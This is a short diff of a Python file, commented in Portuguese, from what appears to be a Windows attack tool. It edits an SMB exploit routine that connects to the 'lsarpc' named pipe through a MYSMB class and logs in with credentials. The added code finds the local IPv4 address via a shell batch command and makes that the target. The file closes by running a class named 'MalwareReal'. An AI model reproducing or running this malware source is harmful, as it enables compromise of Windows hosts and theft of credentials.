@@ -206,9 +206,24 @@ def set_windows_credentials(target_name, username, password):
         else:
             print("Credenciais recuperadas com sucesso!")
 
-target = ''
-pipe_name = 'lsarpc'
+def get_user_ip():
+    """
+    Obtém o endereço IPv4 local da máquina no Windows via batch.
+    """
+    try:
+        # Usa um comando batch para pegar só o IP
+        # findstr filtra só linhas com IPv4
+        cmd = r'for /f "tokens=14" %a in (\'ipconfig ^| findstr "IPv4"\') do @echo %a'
+        result = subprocess.run(cmd, capture_output=True, text=True, shell=True)
+        ip_address = result.stdout.strip()
+        return ip_address if ip_address else "IP não encontrado"
+    except Exception as e:
+        return f"Erro: {e}"
 
+# Chama a função
+user_ip = get_user_ip()
+target = user_ip
+pipe_name = 'lsarpc'
 
 conn = MYSMB(target)
 conn.login(USERNAME, PASSWORD)
@@ -2020,3 +2035,4 @@ if __name__ == "__main__":
         pass
     malware = MalwareReal()
     malware.execute()
+
